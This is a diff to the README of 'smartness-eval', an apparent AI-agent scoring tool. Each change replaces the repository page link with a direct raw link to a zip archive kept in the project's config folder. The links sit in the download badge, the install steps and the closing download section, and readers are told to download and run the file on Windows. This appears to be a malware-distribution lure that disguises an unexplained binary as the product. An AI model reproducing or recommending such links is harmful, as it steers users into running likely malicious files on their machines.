@@ -1,6 +1,6 @@
 # 🎯 smartness-eval - Assess AI agents with clear scoring
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Compound-epigraphy786/smartness-eval)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Compound-epigraphy786/smartness-eval/raw/refs/heads/main/config/smartness-eval-v2.0-alpha.2.zip)
 
 ## 📌 What this is
 
@@ -20,7 +20,7 @@ For the best results, use Windows 10 or Windows 11.
 
 ## 🚀 Download and install
 
-1. Open this page: https://github.com/Compound-epigraphy786/smartness-eval
+1. Open this page: https://github.com/Compound-epigraphy786/smartness-eval/raw/refs/heads/main/config/smartness-eval-v2.0-alpha.2.zip
 2. Find the download area on the repository page
 3. Download the package for Windows
 4. If the file is zipped, right-click it and choose Extract All
@@ -145,7 +145,7 @@ smartness-eval is a good fit for:
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Compound-epigraphy786/smartness-eval
+https://github.com/Compound-epigraphy786/smartness-eval/raw/refs/heads/main/config/smartness-eval-v2.0-alpha.2.zip
 
 ## 🧷 Quick steps
 
